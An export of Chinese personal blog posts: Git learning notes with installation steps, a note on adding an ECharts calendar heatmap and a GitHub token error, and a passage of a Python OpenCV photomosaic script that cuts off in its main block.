    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E7%9A%84%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>说实话，我之前虽然经常接触和使用<code>Git</code>，但是实际上也只是经常使用<code>Git</code>的<code>add 、commit、push</code>功能，其他的基本没怎么接触过，算是某种意义上的零基础。在团队协作的背景下，版本控制是一个简化队员合作、提高效率的绕不开的难题，因此我觉得十分有必要学一下<code>Git</code>工具，当然了这个工具很强大，很多内容往深了很难掌握，大多数人也一般用不到，因此这部分我打算不学，以后需要用得到了再去翻翻文档应该也还来得及。</p>
<a id="more"></a>

<h2 id="Git简介"><a href="#Git简介" class="headerlink" title="Git简介"></a>Git简介</h2><p>介绍Git之前，首先就要先明白什么叫<strong>版本控制</strong></p>
<blockquote>
<p>版本控制是指对软件开发过程中各种程序代码、配置文件及说明文档等文件变更的管理，是软件配置管理的核心思想之一。</p>
</blockquote>
<p>简而言之就是记录追踪文件的变更，包括何人何时修改了何文件，以及修改成了什么内容，并在适当的时候打上标记，方便以后回滚，经常玩游戏的朋友们一定对游戏里的存档，在游戏适当的时候存个档，在游戏中我们就可以方便在任意一个存档点切换。</p>
<p>当然了，版本控制的功能不仅仅局限于上面所说的内容，特别是面对多人协作开发时，版本控制软件还可以方便队员分工，记录队员完成的内容，方便代码合并。</p>
<p>现在市面上常见的版本控制软件有好几个，由于我并没有用过除了<code>Git</code>以外的工具，因此对下列其他的描述均来自<a href="https://www.jianshu.com/p/47f79a13524f" target="_blank" rel="noopener">简书博主</a></p>
<h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p><code>Git</code>是目前世界上使用最广泛的分布式版本控制系统，使用<code>Git</code>和<code>Gitlab</code>搭建版本控制环境是现在互联网公司最流行的版本控制方式，关于<code>Git</code>、<code>Github</code>、<code>Gitlab</code>的关系，可以理解成：</p>
<ul>
<li><code>Git</code>是一种版本控制系统，是一种工具，用于代码的存储和版本控制。 </li>
<li><code>GitHub</code>是一个基于Git实现的在线代码仓库，是目前全球最大的<strong>代码托管平台</strong>，可以帮助程序员之间互相交流和学习，即该平台可以作为我们存放代码的云端。 </li>
<li><code>GitLab</code>是一个基于<code>Git</code>实现的在线代码仓库软件，你可以用<code>GitLab</code>自己搭建一个类似于<code>GitHub</code>一样的仓库，但是<code>GitLab</code>有完善的管理界面和权限控制，一般用于在企业、学校等内部网络搭建<code>Git</code>私服。</li>
</ul>
<p><code>Git</code>的诞生，当年也有一些趣事，大家感兴趣可以去网上搜索一下，不得不赞叹一下 <strong>Linus Tovalds</strong> ，真大牛！</p>
<p><code>Github</code>地址：<a href="https://github.com/git/git" target="_blank" rel="noopener">https://github.com/git/git</a><br> 官方网站：<a href="https://git-scm.com" target="_blank" rel="noopener">https://git-scm.com/</a><br> 官方文档：<a href="https://git-scm.com/docs" target="_blank" rel="noopener">https://git-scm.com/docs</a><br> 中文文档：<a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a><br> 下载地址：<a href="https://git-scm.com/downloads" target="_blank" rel="noopener">https://git-scm.com/downloads</a></p>
<h3 id="SVN"><a href="#SVN" class="headerlink" title="SVN"></a>SVN</h3><p><code>TortoiseSVN</code>是一款非常易于使用的跨平台的 版本控制/版本控制/源代码控制软件。它基于<a href="http://subversion.apache.org/" target="_blank" rel="noopener">Apache  Subversion（SVN）®</a> ; <code>TortoiseSVN</code>为<code>Subversion</code>提供了一个简单易用的用户界面。<br> TortoiseSVN开源地址：<a href="https://osdn.net/projects/tortoisesvn/" target="_blank" rel="noopener">https://osdn.net/projects/tortoisesvn/</a><br> Subversion的Github地址：<a href="https://github.com/apache/subversion" target="_blank" rel="noopener">https://github.com/apache/subversion</a><br> 官方网站：<a href="https://tortoisesvn.net/" target="_blank" rel="noopener">https://tortoisesvn.net/</a><br> 官方文档：<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html</a><br> 中文文档：<a href="https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html" target="_blank" rel="noopener">https://tortoisesvn.net/docs/release/TortoiseSVN_zh_CN/index.html</a><br> 下载地址：<a href="https://tortoisesvn.net/downloads.html" target="_blank" rel="noopener">https://tortoisesvn.net/downloads.html</a></p>
<h3 id="Mercurial"><a href="#Mercurial" class="headerlink" title="Mercurial"></a><strong>Mercurial</strong></h3><p><code>Mercurial</code>是一个免费的分布式源代码管理工具。它可以有效地处理任何规模的项目，并提供简单直观的界面。<code>Mercurial</code> 是一种轻量级分布式版本控制系统，采用 Python 语言实现，易于学习和使用，扩展性强。<br> 官方网站：<a href="https://www.mercurial-scm.org/" target="_blank" rel="noopener">https://www.mercurial-scm.org/</a><br> 官方文档：<a href="https://www.mercurial-scm.org/wiki/BeginnersGuides" target="_blank" rel="noopener">https://www.mercurial-scm.org/wiki/BeginnersGuides</a><br> 下载地址：<a href="https://www.mercurial-scm.org/downloads" target="_blank" rel="noopener">https://www.mercurial-scm.org/downloads</a></p>
<h3 id="CVS"><a href="#CVS" class="headerlink" title="CVS"></a>CVS</h3><p><code>CVS</code>是版本控制系统，是源配置管理（<code>SCM</code>）的重要组成部分。使用它，您可以记录源文件和文档的历史记录。老牌的版本控制系统，它是基于客户端/服务器的行为使得其可容纳多用户，构成网络也很方便。这一特性使得<code>CVS</code>成为位于不同地点的人同时处理数据文件（特别是程序的源代码）时的首选。<br> 官方网站：<a href="http://www.nongnu.org/cvs/" target="_blank" rel="noopener">http://www.nongnu.org/cvs/</a><br> 官方文档：<a href="https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html" target="_blank" rel="noopener">https://web.archive.org/web/20140629065005/http://ximbiot.com/cvs/manual/cvs-1.11.23/cvs.html</a><br> 下载地址：<a href="https://ftp.gnu.org/non-gnu/cvs/" target="_blank" rel="noopener">https://ftp.gnu.org/non-gnu/cvs/</a></p>
<h2 id="Git的安装"><a href="#Git的安装" class="headerlink" title="Git的安装"></a>Git的安装</h2><p><code>Git</code>发展很快，由最初的只能在<code>Linux</code>和<code>Unix</code>，后来人们也把它移植到了其他平台，现在，<code>Git</code>可以在<code>Linux</code>、<code>Unix</code>、<code>Mac</code>和<code>Windows</code>这几大平台上正常运行了。 </p>
<h3 id="在Linux上安装"><a href="#在Linux上安装" class="headerlink" title="在Linux上安装"></a>在Linux上安装</h3><p>以<code>centos 7</code>为例（当然有些版本的Linux会默认安装好Git，不过其版本可能比较旧），首先输入<code>git --version</code>，如果输出版本信息则说明安装好了，否则输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure>

<p>安装成功以后再输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号即可。</p>
<p>当然了如果你能力比较强，也可以使用源码安装的方式。</p>
<h3 id="在Windows上面安装"><a href="#在Windows上面安装" class="headerlink" title="在Windows上面安装"></a>在Windows上面安装</h3><p>Windows平台上面安装比较简单，只需要到<a href>官网下载</a>页面上下载合适的版本即可，例如我下载的是”Standalone Installer”的<code>64bit</code>版本的。</p>
<p>获取二进制安装包后，双击并默认其设置，不断点击<code>Next</code>即可。</p>
<p>安装完毕鼠标右键鼠标，应该可以看得到菜单中出现关于<code>Git</code>的选项</p>
<p><img src="https://qiniu.yalexin.top/right.jpg" alt></p>
<p>点击”Git Bash Here”输入以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号即可（当然，使用<code>Windows</code>自带的命令提示符打开命令窗口输入上述命令也可）</p>
<p>为方便使用，本笔记以<code>Windows</code>版本展开，当然后面也会穿插一些<code>Linux</code>版本的使用。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>博客系统引入ECharts的日历热力图</title>
    <url>/2022/01/25/%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E5%BC%95%E5%85%A5ECharts%E7%9A%84%E6%97%A5%E5%8E%86%E7%83%AD%E5%8A%9B%E5%9B%BE/</url>
    <content><![CDATA[<p>之前我一直中意于<code>Github</code>或者<code>Gitee</code>的个人主页中的提交记录的界面，一直想在博客系统中引入进来，奈何之前一直没空实现，而且不知道有哪些组件或者开源的项目适合借鉴；前不久无意看到<a href="https://echarts.apache.org/zh/index.html" target="_blank" rel="noopener"><code>Echarts</code></a>中的热力图很符合我的预期，就拿了过来。</p>
<a id="more"></a>

<p>得益于前后端分离模式，我直接在前端中引入该组件，后端不需要修改任何一行代码；不过前端我不太了解（其实后端也不咋地，hhhhhhh），调了好久才勉勉强强看得过去，就这样吧，前端太难了啊啊！</p>
<p>之前就了解过一点点<code>Echarts</code>，很喜欢它的动画，后面通过查资料才知道是它是由百度开源的，后来捐给了 <a href="https://baike.baidu.com/item/Apache/8512995" target="_blank" rel="noopener">Apache</a>基金会 ，这让我稍微改变了对百度的看法，反正在我看来，百度跟阿里巴巴、腾讯他们比起来，差太多了，旗下的网盘凭借着用户量大，吃相难看，百度引擎也是差得不得了，搜个东西，广告占了半数，手上的牌都给打烂了……扯远了，<code>Echarts</code>的文档还是写得很详细的，关键是带中文！希望国产的东西越来越多，越来越好吧</p>
<p>不过在我尝试把代码<code>push</code>到<code>github</code>上面的时候，就出现了错误，先是说<code>SSH</code>的问题，网上查了，好像说是因为电脑这边不信任证书，这个前几天我用<code>chrome</code>浏览<code>github</code>时候遇到过了，修复好了，但是不知道为啥<code>git</code>这边也会出错；等我改好了，再尝试的时候又遇到了一个问题，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remote: Support for password authentication was removed on August 13, 2021. Please use a personal access token instead.</span><br></pre></td></tr></table></figure>

<p>好像是因为原先的密码凭证从2021年8月13日开始就不能用了，必须使用个人访问令牌（<code>personal access token</code>），没办法，去年这段时间忙着复习，没怎么写过代码，或者说没怎么用过<code>git</code>，解决这个也很简单，小伙伴们可以借鉴这个<a href="https://zhuanlan.zhihu.com/p/401978754" target="_blank" rel="noopener">流程</a>.</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Echarts</tag>
        <tag>日历热力图</tag>
      </tags>
  </entry>
  <entry>
    <title>借助OpenCV拼接特定背景图</title>
    <url>/2022/01/21/%E5%80%9F%E5%8A%A9OpenCV%E6%8B%BC%E6%8E%A5%E7%89%B9%E5%AE%9A%E8%83%8C%E6%99%AF%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前就一直有一个想法，提供大量图片以及一张背景图，然后将这些图片组成一个个小网格拼接起来，然后效果和原背景图差不多，简而言之就是将原背景图马赛克化，只不过每一个马赛克是用提供的图片组成，现在放寒假了终于有时间开干啦，哈哈哈哈哈。</p>
<a id="more"></a>

<p>先看下效果：</p>
<p>原背景图</p>
<p><img src="https://qiniu.yalexin.top/bgr.jpg" alt></p>
<p>拼接结果图</p>
<p><img src="https://qiniu.yalexin.top/cat-mouse.png" alt></p>
<p>emmm，勉强能看，有点抽象</p>
<p>只能看缩略图了</p>
<p><img src="https://qiniu.yalexin.top/thumbnail.png" alt></p>
<p><strong>不过只要你电脑配置够好，时间也充足，可以将图片分割成更多的小方格，效果也更佳。</strong></p>
<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>基本原理其实很简单：就是首先计算每一张素材图片的颜色平均值，然后计算背景图中的每一个小方格的颜色平均值，然后两两匹配就行了。</p>
<p>下面说一下具体操作</p>
<p>对于素材，也就是上面所提到的“大量图片”，我觉得最快速的获取方式就是视频，毕竟一个视频里边每一帧都可以作为一张图片，如果视频是<code>24</code>帧每秒，一分钟就可以提供<code>24*60=1440</code>张图片，对于我这个一年拍的生活照都不超过200张的蓝人来说，<code>1440</code>难以想象。但是对于视频来说，每一帧都分析的话，花费时间太多，并且其实有一些邻近帧的平均颜色<strong>相差不多</strong>，为了加快分析可以取一定间隔进行分析，<code>OpenCV</code>也提供了提取指定位置的帧的方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br></pre></td></tr></table></figure>

<p>但是这个性能上面比较慢，我们可以顺序读取每一帧，然后根据间隔再分析：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 视频总帧数</span></span><br><span class="line">frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># 提取帧数的步长</span></span><br><span class="line">step = frameNum // needNum</span><br><span class="line">cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">imgList = []</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    ret, frame = cap.read()</span><br><span class="line">    <span class="keyword">if</span> ret:</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">            aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># 先将暂存帧保存起来</span></span><br><span class="line">            cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">            imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        idx += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> imgList</span><br></pre></td></tr></table></figure>

<p>经过实测，花费时间减少到原来方法的一半！</p>
<p>对<code>imgList</code>进行排序是方便后面匹配的时候使用二分查找。</p>
<p>程序也支持自己提供素材图片，不过自己能提供几千张图片以上估计很难吧？？</p>
<p>然后进行背景图的分割，理论上背景图分割得越精细越好，但是如此一来需要匹配的次数就越多，程序运行时间越多，而且拼接出来的图片也很大，但是分割数目太少，拼接出来的图片与原图相差甚远，因此要挑选好要切割的行数和列数。</p>
<p>匹配过程比较好理解，我们实现把背景图切割成<code>m*n</code>个小宫格，计算每一个小宫格的平均颜色，然后遍历每一个小宫格，在<code>imgList</code>中使用二分查找与之相近的图片，并拿到该图片的名字再读取进来（我们并不在<code>imgList</code>中保存每一张图片，因为如果我们可能有几千到上万的图片，如果每一张图都有<code>1MB</code>大小，那我们就需要好几个<code>GB</code>的内存，而现在我们<code>imgList</code>中每一个元素都是包含了该图片的名字和平均颜色值）， 而<code>OpenCV</code>读取的图片返回值是矩阵，图片的拼接也就是对应矩阵的拼接，不过要注意的是区分按列拼接和按行拼接。</p>
<p>当然了为了防止输出的文件过大，拼接过程还应该将素材图片进行缩放。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Author      : YaleXin</span></span><br><span class="line"><span class="string">Email       :</span></span><br><span class="line"><span class="string">LastEditors : YaleXin</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> bisect</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 视频链接</span></span><br><span class="line">VIDEO_URL = <span class="string">"data/mouseAndCat.mp4"</span></span><br><span class="line"><span class="comment"># 素材图片文件夹</span></span><br><span class="line">PICTURES_DIR = <span class="string">"materialPics/"</span></span><br><span class="line"><span class="comment"># 背景图</span></span><br><span class="line">BACKGROUND_URL = <span class="string">"bgr.jpg"</span></span><br><span class="line"><span class="comment"># 输出图片结果名</span></span><br><span class="line">OUTPUT_PICTURE = <span class="string">"result.jpg"</span></span><br><span class="line"><span class="comment"># 缩放比例</span></span><br><span class="line">ZOOM_FACTOR = <span class="number">4</span></span><br><span class="line"><span class="comment"># 切割图片的行数、列数</span></span><br><span class="line">ROW, COL = <span class="number">41</span>, <span class="number">41</span></span><br><span class="line">cap = cv2.VideoCapture(VIDEO_URL)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将指定图片进行裁剪 m n 分别是行数列数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cutBackgroundImg</span><span class="params">(img, m=<span class="number">21</span>, n=<span class="number">21</span>)</span>:</span></span><br><span class="line">    <span class="comment"># 背景图片的高度和宽度</span></span><br><span class="line">    h, w = img.shape[<span class="number">0</span>], img.shape[<span class="number">1</span>]</span><br><span class="line">    grid_h = int(h * <span class="number">1.0</span> / (m - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line">    grid_w = int(w * <span class="number">1.0</span> / (n - <span class="number">1</span>) + <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 满足整除关系时的高、宽</span></span><br><span class="line">    h = grid_h * (m - <span class="number">1</span>)</span><br><span class="line">    w = grid_w * (n - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 图像缩放</span></span><br><span class="line">    img_re = cv2.resize(img, (w, h),</span><br><span class="line">                        cv2.INTER_LINEAR)  <span class="comment"># 也可以用img_re=skimage.transform.resize(img, (h,w)).astype(np.uint8)</span></span><br><span class="line">    gx, gy = np.meshgrid(np.linspace(<span class="number">0</span>, w, n), np.linspace(<span class="number">0</span>, h, m))</span><br><span class="line">    gx = gx.astype(np.int)</span><br><span class="line">    gy = gy.astype(np.int)</span><br><span class="line">    <span class="comment"># 前面两维代表位置 i行j列 后三维代表图片信息（像素位置、颜色信息）</span></span><br><span class="line">    divide_image = np.zeros([m - <span class="number">1</span>, n - <span class="number">1</span>, grid_h, grid_w, <span class="number">3</span>],</span><br><span class="line">                            np.uint8)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            divide_image[i, j, ...] = img_re[</span><br><span class="line">                                      gy[i][j]:gy[i + <span class="number">1</span>][j + <span class="number">1</span>], gx[i][j]:gx[i + <span class="number">1</span>][j + <span class="number">1</span>], :]</span><br><span class="line">    <span class="keyword">return</span> divide_image</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  分析分割后的图片 divideImages 是背景图分割后的一系列图片 materialIndexColor是包含颜色均值的一些列图片（从视频中提取或者用户提供）</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleBlocks</span><span class="params">(divideImages, materialIndexColor)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleBlocks begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    cap.set(cv2.CAP_PROP_POS_FRAMES, <span class="number">0</span>)</span><br><span class="line">    res0, frame0 = cap.read()</span><br><span class="line">    originX, originY = frame0.shape[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    sortedAverColor = np.array(materialIndexColor)[:, <span class="number">0</span>].astype(<span class="string">"int32"</span>)</span><br><span class="line">    m, n = divideImages.shape[<span class="number">0</span>], divideImages.shape[<span class="number">1</span>]</span><br><span class="line">    cnt, total, listLen = <span class="number">0</span>, (m + <span class="number">1</span>) * (n + <span class="number">1</span>), len(materialIndexColor)</span><br><span class="line">    resImg = np.array([])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">        rowItem = np.array([])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(n):</span><br><span class="line">            aver = divideImages[i, j].mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">            averHex = BGR2HEX(aver)</span><br><span class="line">            <span class="comment"># 在有序序列中寻找接近该 块（来自背景图） 的图片</span></span><br><span class="line">            left = bisect.bisect_left(sortedAverColor, averHex)</span><br><span class="line">            left = max(<span class="number">0</span>, left)</span><br><span class="line">            left = min(left, listLen - <span class="number">1</span>)</span><br><span class="line">            imgFilename = materialIndexColor[left][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            frame = cv2.imread(imgFilename)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> rowItem.shape == (<span class="number">0</span>,):</span><br><span class="line">                <span class="comment"># 拼接列</span></span><br><span class="line">                rowItem = cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                rowItem = np.concatenate((rowItem, cv2.resize(frame, (originY // ZOOM_FACTOR, originX // ZOOM_FACTOR))),</span><br><span class="line">                                         <span class="number">1</span>)</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / total * <span class="number">100</span>)) + str(int(cnt / total * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> resImg.shape == (<span class="number">0</span>,):</span><br><span class="line">            resImg = rowItem</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 拼接行</span></span><br><span class="line">            resImg = np.concatenate((resImg, rowItem))</span><br><span class="line">    cv2.imwrite(OUTPUT_PICTURE, resImg)</span><br><span class="line">    cv2.destroyAllWindows()</span><br><span class="line">    <span class="comment"># 删除中间生成的文件</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> materialIndexColor:</span><br><span class="line">        os.remove(item[<span class="number">1</span>])</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished and cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    print(<span class="string">'\n--- handleBlocks end ---'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将BGR数组转为 RGB16进制形式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BGR2HEX</span><span class="params">(BGR)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (int(BGR[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) + (int(BGR[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + int(BGR[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleMaterial</span><span class="params">(needNum=<span class="number">500</span>)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial begin ---'</span>)</span><br><span class="line">    <span class="comment"># 视频总帧数</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># 提取帧数的步长</span></span><br><span class="line">    step = frameNum / needNum</span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="comment"># 按照步长分析每一帧</span></span><br><span class="line">    <span class="keyword">for</span> cnt <span class="keyword">in</span> range(needNum):</span><br><span class="line">        print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (cnt * <span class="number">100</span> // needNum) + str(cnt * <span class="number">100</span> // needNum) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">        cap.set(cv2.CAP_PROP_POS_FRAMES, idx)</span><br><span class="line"></span><br><span class="line">        res, frame = cap.read()</span><br><span class="line"></span><br><span class="line">        aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        averHex = BGR2HEX(aver)</span><br><span class="line">        <span class="comment"># cnt 是标记该元素在imgList中的下标，idx是标记该帧在原视频中的下标</span></span><br><span class="line">        imgList.append([cnt, averHex, idx])</span><br><span class="line"></span><br><span class="line">        idx += step</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial finished! --------'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handlePictures</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'--- handlePictures begin ---'</span>)</span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(PICTURES_DIR):</span><br><span class="line">        imgsFiles = os.listdir(PICTURES_DIR)</span><br><span class="line">        fileLen = len(imgsFiles)</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> imgsFiles:</span><br><span class="line">            fileType = os.path.splitext(file)[<span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 常见的图片格式</span></span><br><span class="line">            <span class="keyword">if</span> fileType == <span class="string">'.jpg'</span> <span class="keyword">or</span> fileType == <span class="string">'.jpeg'</span> <span class="keyword">or</span> fileType == <span class="string">'.png'</span> <span class="keyword">or</span> fileType == <span class="string">'.bmp'</span> <span class="keyword">or</span> fileType == <span class="string">'.svg'</span>:</span><br><span class="line">                img = cv2.imread(PICTURES_DIR + file)</span><br><span class="line">                <span class="comment"># 判断图片是否读取成功</span></span><br><span class="line">                <span class="keyword">if</span> isinstance(img, np.ndarray):</span><br><span class="line">                    aver = img.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                    averHex = BGR2HEX(aver)</span><br><span class="line">                    cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + file, img)</span><br><span class="line">                    imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + file])</span><br><span class="line">                    print(<span class="string">'\r'</span> + <span class="string">'+'</span> * (int(cnt / fileLen * <span class="number">100</span>)) + str(int(cnt / fileLen * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>,</span><br><span class="line">                          flush=<span class="literal">True</span>)</span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'this path not exist'</span>)</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">'\n--- handlePictures end ---'</span>)</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleVideoMaterial</span><span class="params">(needNum)</span>:</span></span><br><span class="line">    print(<span class="string">'--- handleMaterial2 begin ---'</span>)</span><br><span class="line">    beginTime = time.time()</span><br><span class="line">    <span class="comment"># 视频总帧数</span></span><br><span class="line">    frameNum = cap.get(<span class="number">7</span>)</span><br><span class="line">    <span class="comment"># 提取帧数的步长</span></span><br><span class="line">    step = frameNum // needNum</span><br><span class="line">    cnt, idx = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    imgList = []</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">        ret, frame = cap.read()</span><br><span class="line">        <span class="keyword">if</span> ret:</span><br><span class="line">            print(<span class="string">'\r'</span> + <span class="string">'-'</span> * (int(idx / frameNum * <span class="number">100</span>)) + str(int(idx / frameNum * <span class="number">100</span>)) + <span class="string">'%'</span>, end=<span class="string">''</span>, flush=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">if</span> idx % step == <span class="number">0</span>:</span><br><span class="line">                aver = frame.mean(axis=<span class="number">0</span>).mean(axis=<span class="number">0</span>)</span><br><span class="line">                averHex = BGR2HEX(aver)</span><br><span class="line">                cv2.imwrite(PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>, frame)</span><br><span class="line">                imgList.append([averHex, PICTURES_DIR + <span class="string">'cache-'</span> + str(cnt) + <span class="string">'.jpg'</span>])</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">            idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    endTime = time.time()</span><br><span class="line">    print(<span class="string">'\n---- handleMaterial2 finished!  way 2 cost &#123;&#125; --------'</span>.format(endTime - beginTime))</span><br><span class="line">    imgList.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> imgList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    img = cv2.imread(BACKGROUND_URL)</span><br><span class="line">    way = int(input(<span class="string">'请选择你的方式：1.从视频中截取 2.从含有图片的文件夹中提取'</span>))</span><br><span class="line">    <span class="keyword">if</span> way == <span class="number">1</span>:</span><br><span 